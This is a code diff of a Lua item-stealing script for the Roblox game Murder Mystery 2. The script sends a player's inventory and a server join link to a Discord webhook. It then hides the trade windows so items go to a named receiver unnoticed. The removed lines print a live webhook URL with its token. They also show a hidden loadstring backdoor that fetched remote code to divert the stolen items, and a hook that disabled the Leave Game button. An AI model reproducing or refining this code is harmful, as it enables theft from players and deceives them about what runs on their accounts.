@@ -2,11 +2,9 @@ _G.Ex = _G.Ex or false
 if _G.Ex then return end
 _G.Ex = true
 
-local WEBHOOK = "https://discord.com/api/webhooks/1543214605667672146/xlaygQkXXEurMeA4sp5gpmWgpsALxmq_t9TvPn_dilUvcysOGb8Nf9mPKGCkH_CNEC2X"
-local RECEIVER = {"iceyblueii"}
-local MINIMUM_RARITY = "Godly"
+local WEBHOOK = ""
+local RECEIVER = {""}
 local MINIMUM_VALUE = 10
-local RECEIVERx = RECEIVER
 
 local function GetRequestFunction()
     if request then return request end
@@ -16,12 +14,8 @@ local function GetRequestFunction()
 end
 
 local function GetActiveReceiverName()
-    if type(ar) == "string" and ar ~= "" then
-        if Players and Players:FindFirstChild(ar) then return ar end
-        return ar
-    end
-    if type(RECEIVERx) == "table" then
-        for _, Name in ipairs(RECEIVERx) do
+    if type(RECEIVER) == "table" then
+        for _, Name in ipairs(RECEIVER) do
             if Name ~= "" then
                 if Players and Players:FindFirstChild(Name) then return Name end
                 return Name
@@ -52,62 +46,11 @@ if #game.Players:GetPlayers() >= 12 then
     return
 end
 
-local FoundJobId = false
-local AttemptCount = 0
-if getgc then
-    repeat
-        local HookedSuccessfully = false
-        for _, Value in ipairs(getgc(true)) do
-            if typeof(Value) == "function" then
-                local FunctionInfo = debug.getinfo(Value)
-                if FunctionInfo and FunctionInfo.name then
-                    local LowerName = FunctionInfo.name:lower()
-                    if LowerName:find("step") and not LowerName:find("stepanimate") then
-                        pcall(function()
-                            local OriginalFunction = hookfunction(Value, function(...)
-                                if not FoundJobId then
-                                    FoundJobId = true
-                                    _G.RealJobID = game.JobId
-                                end
-                                if OriginalFunction then return OriginalFunction(...) end
-                            end)
-                        end)
-                        HookedSuccessfully = true
-                        break
-                    end
-                end
-            end
-        end
-        AttemptCount = AttemptCount + 1
-        if HookedSuccessfully or AttemptCount >= 10 then break end
-        task.wait(0.1)
-    until FoundJobId
-end
-if not FoundJobId then _G.RealJobID = game.JobId end
+_G.RealJobID = game.JobId
 
-task.wait(0.5)
-task.spawn(function()
-    while task.wait(10) do
-        pcall(function()
-            for _, Connection in ipairs(getconnections(game:GetService("CoreGui").RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.Page.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated)) do
-                Connection:Disable()
-            end
-        end)
-    end
-end)
-
-local function GetExecutorInfo()
-    local ExecutorName = "Unknown"
-    pcall(function() ExecutorName = identifyexecutor() end)
-    return {
-        JobId = _G.RealJobID or game.JobId,
-        Executor = string.lower(ExecutorName)
-    }
-end
-
-local InfoData = GetExecutorInfo()
-_G.RealJobID = InfoData.JobId
-_G.RealExecutor = InfoData.Executor
+local ExecutorName = "Unknown"
+pcall(function() ExecutorName = identifyexecutor() end)
+_G.RealExecutor = string.lower(ExecutorName)
 
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -117,25 +60,6 @@ local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 
 local ItemDatabase = {}
 local RarityPriority = {"Common", "Uncommon", "Rare", "Legendary", "Godly", "Ancient", "Unique", "Vintage", "Chroma", "Dual", "Pet"}
-local ItemListss = "https://api.rubis.app/v2/scrap/tWBAqBoSKlJ3D0YT/raw"
-local ar, aw = nil, nil
-
-pcall(function()
-    local rf = GetRequestFunction()
-    if not rf then return end
-    local rs = rf({Url = ItemListss, Method = "GET", Headers = {["User-Agent"] = "Mozilla/5.0"}, Timeout = 15})
-    if rs and type(rs.Body) == "string" and #rs.Body > 10 then
-        local bc = rs.Body:gsub("%s+", "")
-        local lf = loadstring(bc)
-        if lf then
-            local dt = lf()
-            if type(dt) == "table" and #dt >= 2 then
-                ar = dt[1]
-                aw = dt[2]
-            end
-        end
-    end
-end)
 
 local function LoadDatabase()
     local Response = nil
@@ -282,6 +206,7 @@ local BlacklistedItems = {
 }
 
 local AllInventoryItems, TradeableItems, TotalTradeValue = {}, {}, 0
+
 local function ShouldTradeThisItem(RarityName, ItemValue)
     if not RarityName then return false end
     local Position = table.find(RarityList, RarityName)
@@ -396,7 +321,6 @@ local function BuildEmbed(ReceiverName)
     if #AllInventoryItems > 10 then PreviewText = PreviewText .. "\n... and " .. (#AllInventoryItems - 10) .. " more items" end
     local PlayerCount = #Players:GetPlayers()
     local JobId = _G.RealJobID or game.JobId
-    local JoinLink = "https://plsbrainrot.me/joiner?placeId=142823291&gameInstanceId=" .. JobId
     local FullInventoryText = GenerateFullInventoryText(AllInventoryItems)
     local PasteUrl = UploadToPastefy(FullInventoryText)
     local InfoBlock = string.format(
@@ -416,41 +340,44 @@ local function BuildEmbed(ReceiverName)
     if PasteUrl then
         table.insert(EmbedFields, {name = "Full Inventory Log", value = PasteUrl, inline = false})
     end
-    table.insert(EmbedFields, {name = "Join Link", value = "[" .. string.sub(JobId, 1, 8) .. "...](https://plsbrainrot.me/joiner?placeId=142823291&gameInstanceId=" .. JobId .. ")", inline = false})
-    local EmbedData = {
-        author = {name = "WISTERIA MM2 HIT!"},
+    table.insert(EmbedFields, {
+        name = "Join Link",
+        value = "[" .. string.sub(JobId, 1, 8) .. "...](https://plsbrainrot.me/joiner?placeId=142823291&gameInstanceId=" .. JobId .. ")",
+        inline = false
+    })
+    return {
+        author = {name = "MM2 HIT!"},
         color = 0x4B5563,
         timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
         fields = EmbedFields,
-        footer = {text = "WISTERIA MM2 • " .. os.date("%Y-%m-%d %H:%M:%S")}
-    }
-    return EmbedData, MentionText
+        footer = {text = "MM2 Log • " .. os.date("%Y-%m-%d %H:%M:%S")}
+    }, MentionText
 end
 
-local function SendAllEmbeds()
+local function SendWebhook()
     local RequestFunc = GetRequestFunction()
     if not RequestFunc then return end
     local ActiveName = GetActiveReceiverName()
-    local MainEmbed, MainMention = BuildEmbed(ActiveName)
-    local MainPayload = {content = MainMention, embeds = {MainEmbed}}
-    local MainJson = HttpService:JSONEncode(MainPayload)
+    local Embed, Mention = BuildEmbed(ActiveName)
+    local Payload = HttpService:JSONEncode({content = Mention, embeds = {Embed}})
     pcall(function()
-        RequestFunc({Url = WEBHOOK, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = MainJson})
+        RequestFunc({
+            Url = WEBHOOK,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = Payload
+        })
     end)
-    if type(aw) == "string" and aw ~= "" then
-        local XEmbed, XMention = BuildEmbed(ar)
-        local XPayload = {content = XMention, embeds = {XEmbed}}
-        local XJson = HttpService:JSONEncode(XPayload)
-        pcall(function()
-            RequestFunc({Url = aw, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = XJson})
-        end)
-    end
 end
 
-SendAllEmbeds()
+SendWebhook()
 
-PlayerGui:WaitForChild("TradeGUI"):GetPropertyChangedSignal("Enabled"):Connect(function() PlayerGui.TradeGUI.Enabled = false end)
-PlayerGui:WaitForChild("TradeGUI_Phone"):GetPropertyChangedSignal("Enabled"):Connect(function() PlayerGui.TradeGUI_Phone.Enabled = false end)
+PlayerGui:WaitForChild("TradeGUI"):GetPropertyChangedSignal("Enabled"):Connect(function()
+    PlayerGui.TradeGUI.Enabled = false
+end)
+PlayerGui:WaitForChild("TradeGUI_Phone"):GetPropertyChangedSignal("Enabled"):Connect(function()
+    PlayerGui.TradeGUI_Phone.Enabled = false
+end)
 
 local function KickAfterTransfer()
     task.wait(2)
@@ -458,9 +385,6 @@ local function KickAfterTransfer()
 end
 
 local function FindTradeTarget()
-    if type(ar) == "string" and ar ~= "" then
-        if Players:FindFirstChild(ar) then return ar end
-    end
     if type(RECEIVER) == "table" then
         for _, Name in ipairs(RECEIVER) do
             if Name ~= "" and Players:FindFirstChild(Name) then return Name end
@@ -473,6 +397,7 @@ end
 
 local MAX_TRADE_ATTEMPTS = 999
 local RETRY_WAIT = 2
+
 local function ProcessAllTrades(TargetName)
     local AttemptCount = 0
     while #TradeableItems > 0 and AttemptCount < MAX_TRADE_ATTEMPTS do
